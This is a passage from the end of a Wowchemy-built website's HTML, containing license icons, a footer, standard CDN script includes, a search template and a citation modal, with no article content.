fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-by fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nc fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nd fa-2x" aria-hidden=true></i></a></p><p class=powered-by>Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target=_blank rel=noopener>Wowchemy</a> â€” the free, <a href=https://github.com/wowchemy/wowchemy-hugo-themes target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></div><script src=/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js></script>
<script id=search-hit-fuse-template type=text/x-template>
    <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
    </div>
  </script><script src=https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin=anonymous></script>
<script id=page-data type=application/json>{"use_headroom":true}</script><script src=/js/wowchemy-headroom.db4755770454eb63685f8de785c0a172.js type=module></script>
<script src=/en/js/wowchemy.min.e8ee06ba8371980ffde659871dd593b0.js></script><div id=modal class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><h5 class=modal-title>Cite</h5><button type=button class=close data-dismiss=modal aria-label=Close>
<span aria-hidden=true>&#215;</span></button></div><div class=modal-body><pre><code></code></pre></div><div class=modal-footer><a class="btn btn-outline-primary my-1 js-copy-cite" href=# target=_blank><i class="fas fa-copy"></i> Copy</a>
<a class="btn btn-outline-primary my-1 js-download-cite" href=# target=_blank><i class="fas fa-download"></i> Download</a><div id=modal-error></div></div></div></div></div><script src=/js/wowchemy-publication.68f8d7090562ca65fc6d3cb3f8f2d2cb.js type=module></script></body></html>